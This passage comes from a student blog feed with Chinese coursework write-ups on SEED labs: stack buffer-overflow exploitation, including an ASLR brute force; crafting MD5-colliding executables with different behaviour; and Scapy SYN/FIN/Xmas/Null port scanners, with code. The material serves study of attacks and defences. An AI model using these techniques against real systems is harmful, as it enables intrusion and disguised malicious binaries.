alt="image-20231012170430304"></p></li><li><p>修改exploit.py文件，把ret修改为shellcode的入口，为ebp+8，把offset设为从buffer到栈里面ret位置的长度，栈从高到下为ret，ebp，…，buffer，所以offset就是ebp的地址+4-buffer的地址</p><p><img src="/../image/image-20231012170116706.png" alt="image-20231012170116706"></p><p><img src="/../image/image-20231012170245291.png" alt="image-20231012170245291"></p></li><li><p>运行exploit，把badfile传到服务器1</p><p><img src="/../image/image-20231011193720889.png" alt="image-20231011193720889"></p><p><img src="/../image/image-20231012170506380.png" alt="image-20231012170506380"></p></li></ol><h3 id="task3：Level-2-Attack"><a href="#task3：Level-2-Attack" class="headerlink" title="task3：Level-2 Attack"></a>task3：Level-2 Attack</h3><ol><li><p>向服务器发送未修改的py文件，获取buffer地址</p><p><img src="/../image/image-20231012170759277.png" alt="image-20231012170759277"></p></li><li><p>由于buffer的长度在100到300之间，且offset是4的倍数，所以可以在100到300之间每隔4字节插入shellcode的入口</p><p><img src="/../image/image-20231012171907286.png" alt="image-20231012171907286"></p></li><li><p>运行exploit，把badfile传到服务器2</p><p><img src="/../image/image-20231012171956728.png" alt="image-20231012171956728"></p><p><img src="/../image/image-20231012172008180.png" alt="image-20231012172008180"></p></li></ol><h3 id="task4：level-3-Attack"><a href="#task4：level-3-Attack" class="headerlink" title="task4：level-3 Attack"></a>task4：level-3 Attack</h3><ol><li><p>向服务器发送未修改的py文件，获取buffer地址</p><p><img src="/../image/image-20231012173155679.png" alt="image-20231012173155679"></p></li><li><p>由于是64位地址格式是0x0000XXXXXXXXXXXX，而strcpy()函数遇到0就截断，而linux是小端存储，所以还把shellcode放在ret上面的时候恰好复制完ret的时候就会截断，不会复制后面的shellcode，于是把shellcode放到ret下面，为了保证不被ret覆盖一部分，所以保险做法是放在buffer的开始处，即start=0。</p><p><img src="/../image/image-20231012175143819.png" alt="image-20231012175143819"></p></li><li><p>运行exploit，把badfile传到服务器3</p><p><img src="/../image/image-20231012175229672.png" alt="image-20231012175229672"></p><p><img src="/../image/image-20231012175246555.png" alt="image-20231012175246555"></p></li></ol><h3 id="task5：level-4-Attack"><a href="#task5：level-4-Attack" class="headerlink" title="task5：level-4 Attack"></a>task5：level-4 Attack</h3><ol><li><p>向服务器发送未修改的py文件，获取buffer地址</p><p><img src="/../image/image-20231014185646914.png" alt="image-20231014185646914"></p></li><li><p>由于缓冲区大小只有96所以就不能把shellcode放在缓冲区内，而放在ret段后面又会被截断。badfile传进目标程序时已载入数据段，因此尽可能将ret设置大一点，跳转到数据段的shellcode代码部分执行shellcode，根据网上找到的资料：ret=rbp+n，n在1184与1424之间。</p><p><img src="/../image/image-20231014191549602.png" alt="image-20231014191549602"></p></li><li><p>运行exploit，把badfile传到服务器4</p><p><img src="/../image/image-20231014191743332.png" alt="image-20231014191743332"></p><p><img src="/../image/image-20231014191800314.png" alt="image-20231014191800314"></p></li></ol><h3 id="task6：地址随机化"><a href="#task6：地址随机化" class="headerlink" title="task6：地址随机化"></a>task6：地址随机化</h3><ol><li>开启内存地址随机化保护, 并用server-1与server-2上的目标程序进行检验</li></ol><p>   <img src="/../image/image-20231014205925941.png" alt="image-20231014205925941"></p><p>   <img src="/../image/image-20231014205956059.png" alt="image-20231014205956059"></p><ol start="2"><li><p>设目标程序为server-1上的，并修改exploit.py文件中的shellcode</p><p><img src="/../image/image-20231014210832598.png" alt="image-20231014210832598"></p></li><li><p>在/Labsetup/attack-code目录下执行exploit.py程序，并另打开一窗口进行监听</p><p><img src="/../image/image-20231014211225899.png" alt="image-20231014211225899"></p></li><li><p>执行brute-force.sh程序，在8702次成功攻击</p><p><img src="/../image/image-20231014211453166.png" alt="image-20231014211453166"></p><p><img src="/../image/image-20231014211717219.png" alt="image-20231014211717219"></p></li></ol><h3 id="Task7：针对缓冲区溢出攻击的其他几个对策"><a href="#Task7：针对缓冲区溢出攻击的其他几个对策" class="headerlink" title="Task7：针对缓冲区溢出攻击的其他几个对策"></a>Task7：针对缓冲区溢出攻击的其他几个对策</h3><ol><li>打开StackGuard保护，并将badfile文件传输到stack-L1文件中，在/Labsetup/serve-code目录下直接执行stack-L1文件</li></ol><p>   <img src="/../image/image-20231014215103527.png" alt="image-20231014215103527"></p><ol start="2"><li><p>打开Non-executable Stack（栈堆不可执行）保护</p><p><img src="/../image/image-20231014215602762.png" alt="image-20231014215602762"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实验3：MD5碰撞实验</title>
      <link href="/2023/10/05/wang-luo-gong-fang-shi-yan-3/"/>
      <url>/2023/10/05/wang-luo-gong-fang-shi-yan-3/</url>
      
        <content type="html"><![CDATA[<div align="center">    <font size="6">实验3：MD5碰撞实验</font></div><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>使用SEED实验环境中的工具及编程语言，完成以下任务：</p><p>a) 使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</p><p>b) 参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</p><p>c) 参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</p><p>d) 回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>SEED虚拟机</p><h3 id="实验步骤及结果"><a href="#实验步骤及结果" class="headerlink" title="实验步骤及结果"></a>实验步骤及结果</h3><ol><li><p>任务1：生成两个MD5值相同的文件</p><ul><li><p>创建prefix.txt文件并写入内容<img src="/../image/image-20231005205521361.png" alt="image-20231005205521361"></p></li><li><p>使用md5collgen生成两个MD5值相同的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5collgen <span class="token parameter variable">-p</span> prefix.txt <span class="token parameter variable">-o</span> out1.bin out2.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../image/image-20231005205916986.png" alt="image-20231005205916986"></p></li><li><p>验证文件是否相同、MD5是否相同</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">diff</span> out1.bin out2.binmd5sum out1.binmd5sum out2.bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../image/image-20231005210246224.png" alt="image-20231005210246224"></p></li><li><p>使用十六进制编辑器查看两个文件内容</p><p><img src="/../image/image-20231005210610753.png" alt="image-20231005210610753"></p><p>发现两个文件部分不同</p></li></ul></li><li><p>任务2：参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件</p><ul><li><p>修改代码如下<img src="/../image/image-20231005211023621.png" alt="image-20231005211023621"></p></li><li><p>编译执行查看结果<img src="/../image/image-20231005211336751.png" alt="image-20231005211336751"></p></li><li><p>查看二进制文件，发现数组是从0x3020(12320)到0x30e7(12519),而12352是64的倍数，所以截取前12352为前缀，12480后的部分为后缀</p><p><img src="/../image/image-20231005212129804.png" alt="image-20231005212129804"></p><p><img src="/../image/image-20231005213222649.png" alt="image-20231005213222649"></p></li><li><p>用前缀生成两个md5值相同的前缀<img src="/../image/image-20231005213414229.png" alt="image-20231005213414229"></p></li><li><p>将尾部接到这两个前缀的后面<img src="/../image/image-20231005213758032.png" alt="image-20231005213758032"></p></li><li><p>执行并比较发现输出不同，md5相同<img src="/../image/image-20231005214249208.png" alt="image-20231005214249208"></p></li></ul></li><li><p>参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件</p><ul><li><p>编写如下程序，在两个数组相同时执行好的代码，否则执行恶意代码<img src="/../image/image-20231006172620206.png" alt="image-20231006172620206"></p></li><li><p>编译查看结果<img src="/../image/image-20231006170841790.png" alt="image-20231006170841790"></p></li><li><p>查看二进制文件，得到两个数组位置0x3020(12320)到0x30e7(12519)和0x3100(12544)到0x31c7(12743)</p><p><img src="/../image/image-20231006172805877.png" alt="image-20231006172805877"></p><p><img src="/../image/image-20231006172946433.png" alt="image-20231006172946433"></p></li><li><p>将第一个数组的一部分和前面的东西从12352截取为前缀<img src="/../image/image-20231006173338371.png" alt="image-20231006173338371"></p></li><li><p>将此前缀生成两个md5值相同的文件<img src="/../image/image-20231006171806160.png" alt="image-20231006171806160"></p></li><li><p>生成的前缀1拼接到后128位的设为P，前缀2的设为Q，截取P<img src="/../image/image-20231006180733120.png" alt="image-20231006180733120"></p></li><li><p>接下来把P拼接到第二个数组中，与两个前缀拼接起来<img src="/../image/image-20231006181550642.png" alt="image-20231006181550642"></p></li><li><p>运行生成的两个程序，并比较md5值<img src="/../image/image-20231006181706388.png" alt="image-20231006181706388"></p></li></ul></li><li><p>通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><p>对于具有相同md5值的输入M和N，添加相同的后缀，md5值仍然相同。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实验2:端口扫描实验</title>
      <link href="/2023/09/23/wang-luo-gong-fang-shi-yan-2/"/>
      <url>/2023/09/23/wang-luo-gong-fang-shi-yan-2/</url>
      
        <content type="html"><![CDATA[<div align="center">    <font size="6">实验2：端口扫描实验</font></div><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>使用Python（Scapy库）编写端口扫描程序，对目标IP（包含IP地址段）进行扫描，完成以下功能：</p><p>1）使用ICMP协议探测主机是否开启；</p><p>2）对本机（关闭防火墙）的开放端口和非开放端口完成半连接、ACK、FIN、Null、Xmas、Windows扫描，并与Nmap扫描结果进行比较。</p><p>3）对远程（有防火墙）主机的开放端口和非开放端口完成半连接、ACK、FIN、Null、Xmas、Windows扫描，并与2）进行比较，分析结果。</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>IntelliJ IDEA 2022.2.5</p><p>python 3.11.4</p><h3 id="实验步骤及结果"><a href="#实验步骤及结果" class="headerlink" title="实验步骤及结果"></a>实验步骤及结果</h3><ol><li><p>在课上完成ping函数实现使用ICMP探测主机是否开启</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    package <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span> <span class="token operator">/</span> ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token string">b'Welcome to my world!'</span>    reply <span class="token operator">=</span> sr1<span class="token punctuation">(</span>package<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> reply<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'主机</span><span class="token interpolation"><span class="token punctuation">{</span>host<span class="token punctuation">}</span></span><span class="token string">可达'</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'主机</span><span class="token interpolation"><span class="token punctuation">{</span>host<span class="token punctuation">}</span></span><span class="token string">不可达'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用了Scapy库来构造和发送ICMP数据包，有回应就是开启的，否则是关闭的。</p><p>结果：<img src="/../image/image-20230921174022363.png" alt="image-20230921174022363"></p></li><li><p>模仿scan_T函数完成scan_S,scan_F,scan_X,scan_N函数，实现半连接，FIN，X_mas，Null扫描</p><p>scan_T：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scan_T</span><span class="token punctuation">(</span>dst_ip<span class="token punctuation">,</span> dst_port<span class="token punctuation">)</span><span class="token punctuation">:</span>    tcp_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>dst_ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>dst_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tcp_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"SA"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 第三次握手，这句实际没有用，已经判定端口处于开放状态</span>            send_rst <span class="token operator">=</span> sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>dst_ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>dst_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"AR"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                          timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 全连接 AR =&gt; ACK+RST</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Open"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先尝试建立TCP连接，如果连接成功，它会检查TCP标志位。如果标志位为”SA”，表示第三次握手已经完成，端口处于开放状态。然后发送一个全连接请求（SYN+ACK+RST），并打印”Open”。如果连接失败或者标志位不是”SA”，则打印”Closed”。</p><p>scan_S：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scan_S</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    syn_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> syn_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> syn_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>syn_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> syn_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"SA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Open"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>syn_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先尝试建立TCP连接，如果连接成功，它会检查TCP标志位。如果标志位为”SA”，表示三次握手已经完成，端口处于开放状态。然后打印”Open”。如果连接失败或者标志位不是”SA”，则打印”Closed”。</p><p>scan_F：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scan_F</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    fin_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"F"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> fin_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Open|Filtered"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> fin_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>fin_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> fin_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送标识位带有FIN包，返回空的话可能是开放或被防火墙过滤，如果返回的标志位是RA说明是关闭的。</p><p>scan_X：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scan_X</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    xmas_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">'FPU'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> xmas_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Open|Filtered"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> xmas_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>xmas_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> xmas_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送标识位带有PSH,FIN,URG包，返回空的话可能是开放或被防火墙过滤，如果返回的标志位是RA说明是关闭的。</p><p>scan_N：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scan_N</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    Null_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> Null_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Open"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> Null_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>Null_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> Null_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送标识位是空的包，返回空的话可能是开放或被防火墙过滤，如果返回的标志位是RA说明是关闭的。</p></li></ol><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>扫描老师的主机的开放和未开放端口，开放的全部成功，未开放的端口用FIN，Xmas，Null扫描结果是开放的，可能被过滤了<img src="/../image/image-20230923211134481.png" alt="image-20230923211134481"></p><p><img src="/../image/image-20230923211454525.png" alt="image-20230923211454525"></p><p><img src="/../image/image-20230923211600982.png" alt="image-20230923211600982"></p><p><img src="/../image/image-20230923211704955.png" alt="image-20230923211704955"></p><p>扫描本机虚拟机开放和未开放端口结果全部正确</p><p><img src="/../image/image-20230923213054126.png" alt="image-20230923213054126"><img src="/../image/image-20230923213121886.png" alt="image-20230923213121886"><img src="/../image/image-20230923213148058.png" alt="image-20230923213148058"></p><h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet <span class="token keyword">import</span> IP<span class="token punctuation">,</span> TCP<span class="token punctuation">,</span> ICMP<span class="token triple-quoted-string string">'''通过设置flags位为'*',根据不同的扫描方式修改‘*’的值'''</span><span class="token keyword">def</span> <span class="token function">scan_T</span><span class="token punctuation">(</span>dst_ip<span class="token punctuation">,</span> dst_port<span class="token punctuation">)</span><span class="token punctuation">:</span>    tcp_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>dst_ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>dst_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tcp_connect_scan_resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>dst_port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"SA"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 第三次握手，这句实际没有用，已经判定端口处于开放状态</span>            send_rst <span class="token operator">=</span> sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>dst_ip<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>dst_port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"AR"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                          timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 全连接 AR =&gt; ACK+RST</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>dst_port<span class="token punctuation">}</span></span><span class="token string">Open"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>tcp_connect_scan_resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>dst_port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"端口</span><span class="token interpolation"><span class="token punctuation">{</span>dst_port<span class="token punctuation">}</span></span><span class="token string">Closed"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan_S</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    syn_connect_scan_resp <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span> 